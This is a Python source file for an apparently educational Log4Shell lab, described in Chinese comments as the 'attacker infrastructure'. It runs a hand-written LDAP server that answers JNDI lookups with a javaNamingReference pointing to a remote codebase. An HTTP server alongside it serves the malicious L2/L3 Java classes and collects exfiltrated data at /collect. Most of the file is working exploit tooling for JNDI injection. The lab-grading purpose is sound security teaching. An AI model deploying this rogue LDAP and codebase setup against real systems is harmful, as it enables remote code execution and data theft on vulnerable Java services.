"""Log4Shell 靶场的"攻击者基础设施"，只用 Python 标准库。

一个进程同时跑两个服务：

  1389  极简 LDAP 服务器
        手写 BER 编解码，只认 bindRequest / searchRequest 两种请求。
        search 时返回一个 javaNamingReference，把 javaCodeBase 指向下面的
        HTTP 服务；JNDI 客户端就会去下载 .class 并在自己的 JVM 里加载。

  8000  HTTP 服务
        /L2.class /L3.class   托管编译好的"恶意类"
        /collect              恶意类把读到的 flag POST 回来
        /events               返回当前所有事件（poc 用它判题）
        /reset                清空事件（每关开始前调用）

事件故意全部留痕：不只是"成功没成功"，还包括 bind / search 的原始 DN、
class 下载、flag 回传。这样 L4 才能看清楚"JDK 加固后回连还在，但 RCE 没了"。
"""

import http.server
import json
import re
import socketserver
import threading
import time
from pathlib import Path

EVENTS = []
LOCK = threading.Lock()
CODEBASE = "http://attacker:8000/"


def log(kind, **kw):
    with LOCK:
        EVENTS.append({"t": round(time.time(), 3), "kind": kind, **kw})


# =============================================================================
#  BER 编解码
#
#  LDAP 报文全是 TLV：1 字节 tag + 长度 + 内容。
#  长度 < 128 用一字节；否则第一字节写 0x80|字节数，后面跟大端长度。
#  我们只需要够用的子集，不实现 indefinite length 和复杂 filter 解析。
# =============================================================================
def ber_len(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def tlv(tag, value):
    if isinstance(value, str):
        value = value.encode()
    return bytes([tag]) + ber_len(len(value)) + value


def integer(n):
    return tlv(0x02, bytes([n]))


def octet(s):
    return tlv(0x04, s)


def enumerated(n):
    return tlv(0x0A, bytes([n]))


def seq(*items):
    return tlv(0x30, b"".join(items))


def setof(*items):
    return tlv(0x31, b"".join(items))


def read_tlv(buf, pos):
    if pos + 2 > len(buf):
        raise ValueError("header truncated")
    tag = buf[pos]
    pos += 1
    n = buf[pos]
    pos += 1
    if n & 0x80:
        k = n & 0x7F
        if k == 0 or pos + k > len(buf):
            raise ValueError("bad long length")
        n = int.from_bytes(buf[pos:pos + k], "big")
        pos += k
    if pos + n > len(buf):
        raise ValueError("value truncated")
    return tag, buf[pos:pos + n], pos + n


def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed")
        buf += chunk
    return buf


def recv_message(conn):
    """读一个完整 LDAPMessage（顶层永远是 SEQUENCE），返回它的内容部分。"""
    head = recv_exact(conn, 2)
    if head[0] != 0x30:
        raise ValueError("not a SEQUENCE: %02x" % head[0])
    n = head[1]
    if n & 0x80:
        k = n & 0x7F
        n = int.from_bytes(recv_exact(conn, k), "big")
    return recv_exact(conn, n)


def ldap_result(tag, code=0):
    """LDAPResult：resultCode + matchedDN + diagnosticMessage。"""
    return tlv(tag, enumerated(code) + octet(b"") + octet(b""))


def reference_entry(msgid, base, factory):
    """SearchResultEntry：一个 JNDI Reference，指向远程 codebase。

    factory 为 None 时故意只回一个不含 javaCodeBase 的空引用 —— L1 的探测
    阶段只需要看到 LDAP 回连，不能顺手把 L2 的 RCE 触发了，否则关卡串味。
    """
    attrs = [
        seq(octet(b"objectClass"), setof(octet(b"javaNamingReference"))),
        seq(octet(b"javaClassName"), setof(octet(b"java.lang.String"))),
    ]
    if factory:
        attrs += [
            seq(octet(b"javaFactory"), setof(octet(factory))),
            seq(octet(b"javaCodeBase"), setof(octet(CODEBASE))),
        ]
    entry = tlv(0x64, octet(base.encode("utf-8", "replace")) + seq(*attrs))
    done = ldap_result(0x65)
    return (seq(integer(msgid), entry), seq(integer(msgid), done))


class LdapHandler(socketserver.BaseRequestHandler):
    def handle(self):
        conn = self.request
        conn.settimeout(20)
        peer = self.client_address[0]
        try:
            while True:
                raw = recv_message(conn)
                log("ldap_raw", peer=peer,
                    raw=raw.decode("latin-1", "replace"))

                _, mid, pos = read_tlv(raw, 0)
                msgid = int.from_bytes(mid, "big") if mid else 1
                optag, opval, _ = read_tlv(raw, pos)

                if optag == 0x60:                     # BindRequest
                    log("ldap_bind", peer=peer)
                    conn.sendall(seq(integer(msgid), ldap_result(0x61)))
                    continue

                if optag == 0x63:                     # SearchRequest
                    btag, bval, _ = read_tlv(opval, 0)
                    base = (bval.decode("utf-8", "replace")
                            if btag == 0x04 else "")
                    log("ldap_search", peer=peer, base=base)

                    # 查询路径决定下载哪个类；未知路径只回连、不给 codebase
                    key = base.strip("/").lower()
                    factory = {"l2": "L2", "l3": "L3"}.get(key)
                    for msg in reference_entry(msgid, base, factory):
                        conn.sendall(msg)
                    continue

                if optag in (0x42, 0x50):             # unbind / abandon
                    return
        except (ConnectionError, ValueError, OSError):
            return
        finally:
            conn.close()


class LdapServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


# =============================================================================
#  HTTP：codebase + 事件接口
# =============================================================================
class HttpHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]

        if path in ("/L2.class", "/L3.class"):
            f = Path("/serve") / path.lstrip("/")
            if not f.exists():
                self._send(404, "no class")
                return
            data = f.read_bytes()
            log("codebase", file=path, size=len(data), peer=self.client_address[0])
            self._send(200, data, "application/octet-stream")
            return

        if path == "/events":
            with LOCK:
                snapshot = list(EVENTS)
            self._send(200, json.dumps(snapshot, ensure_ascii=False, indent=2),
                       "application/json; charset=utf-8")
            return

        if path == "/reset":
            with LOCK:
                EVENTS.clear()
            self._send(200, "ok")
            return

        if path == "/":
            self._send(200,
                       "SecLab Log4Shell attacker\n"
                       "  LDAP  1389  -> javaNamingReference\n"
                       "  HTTP  8000  /L2.class /L3.class /collect /events /reset\n")
            return

        self._send(404, "not found")

    def do_POST(self):
        if self.path.split("?", 1)[0] != "/collect":
            self._send(404, "not found")
            return
        n = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace") if n else ""
        log("collect", body=body, peer=self.client_address[0])
        self._send(200, "ok")

    def log_message(self, fmt, *args):
        pass                                    # 别把每条 GET 刷进 docker logs


class HttpServer(http.server.ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    ldap = LdapServer(("0.0.0.0", 1389), LdapHandler)
    threading.Thread(target=ldap.serve_forever, daemon=True).start()
    print("[attacker] LDAP 0.0.0.0:1389 ready", flush=True)

    httpd = HttpServer(("0.0.0.0", 8000), HttpHandler)
    print("[attacker] HTTP 0.0.0.0:8000 ready (codebase / events / reset)",
          flush=True)
    httpd.serve_forever()


if __name__ == "__main__":
    main()
